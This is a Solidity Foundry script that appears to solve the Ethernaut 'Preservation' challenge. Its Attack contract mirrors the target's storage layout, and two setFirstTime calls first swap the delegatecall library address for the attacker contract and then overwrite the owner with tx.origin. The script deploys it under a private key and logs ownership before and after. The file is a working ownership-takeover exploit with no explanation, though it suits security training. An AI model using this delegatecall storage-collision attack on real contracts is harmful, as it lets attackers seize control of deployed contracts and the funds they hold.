//SPDX-License-Identifier: MIY
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../Instances/Preservation.sol";

contract Attack {
    address public slot1;
    address public slot2;
    address public owner;
    Preservation target = Preservation(0x920E7d4A854521504152d0a9Cf8bc3A47fCe5b30);      


    function exploit() public {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(tx.origin)));
        require(target.owner() == tx.origin, "Hack Failed");
    }


    function setTime(uint _owner) external {
        owner = address(uint160(_owner));
    }
}

contract Exploit is Script{
    Preservation public target = Preservation(0xF274E3101b9A240441d867c27567C7B1f954D28e);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        address owner = target.owner();
        console.log("owner: ", owner);
        attack.exploit();
        owner = target.owner();
        console.log("owner: ", owner);
        console.log("origin: ", tx.origin);
        vm.stopBroadcast();
    }
}